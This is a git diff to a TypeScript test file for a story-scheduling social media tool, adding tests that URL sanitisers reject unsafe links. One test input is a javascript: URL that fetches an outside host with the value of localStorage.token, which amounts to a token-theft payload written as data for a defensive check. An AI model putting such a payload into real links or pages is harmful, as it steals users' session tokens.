@@ -1,8 +1,10 @@
 import { describe, expect, it } from 'vitest';
 import { canDrag, storyBadge, type SchedulingItem } from '@/lib/postingSchedule';
 import {
-  defaultRepeat, repeatFromRule, repeatPayload, repeatProblem, repeatSummary, storyGuidance, upcomingDates,
+  defaultRepeat, repeatFromRule, repeatPayload, repeatProblem, repeatSummary, safeMediaUrl, safeStoryLink, storyGuidance,
+  upcomingDates,
 } from '@/lib/storySeries';
+import { storyManagedBySchedule } from '@/services/socialPostsApi';
 
 const item = (over: Partial<SchedulingItem> = {}): SchedulingItem => ({
   key: 'post:1', kind: 'post', id: '1', title: 'Story', content_type: 'stories', type: 'story',
@@ -67,5 +69,25 @@ describe('repetição na tela', () => {
   it('orientação curta do lembrete', () => {
     expect(storyGuidance('Agende sua consulta', 'https://agenciapulse.tech/r/clinica-wa'))
       .toBe('Poste pelo app com o adesivo de link na parte de baixo. Botão: Agende sua consulta. Link: https://agenciapulse.tech/r/clinica-wa');
+  });
+});
+
+describe('segurança e telas do Social (revisão)', () => {
+  it('link do story só https vira link; javascript: e http não', () => {
+    expect(safeStoryLink('https://agenciapulse.tech/r/clinica-wa')).toBe('https://agenciapulse.tech/r/clinica-wa');
+    expect(safeStoryLink('javascript:fetch("https://x/?t="+localStorage.token)')).toBeNull();
+    expect(safeStoryLink('http://site-falso/x')).toBeNull();
+    expect(safeStoryLink('')).toBeNull();
+    expect(safeMediaUrl('http://127.0.0.1:9/video.mp4')).toBe('http://127.0.0.1:9/video.mp4');
+    expect(safeMediaUrl('javascript:alert(1)')).toBeNull();
+  });
+
+  it('Entregas Social e Kanban Social reconhecem o lembrete e a repetição do Agendamentos', () => {
+    expect(storyManagedBySchedule({ story_mode: 'lembrete', story_series_id: null })).toBe('lembrete');
+    expect(storyManagedBySchedule({ story_mode: 'lembrete', story_series_id: 's1' })).toBe('serie');
+    expect(storyManagedBySchedule({ story_mode: 'auto', story_series_id: 's1' })).toBe('serie');
+    expect(storyManagedBySchedule({ story_mode: 'auto', story_series_id: null })).toBeNull();
+    expect(storyManagedBySchedule({ story_mode: null })).toBeNull();
+    expect(storyManagedBySchedule(null)).toBeNull();
   });
 });
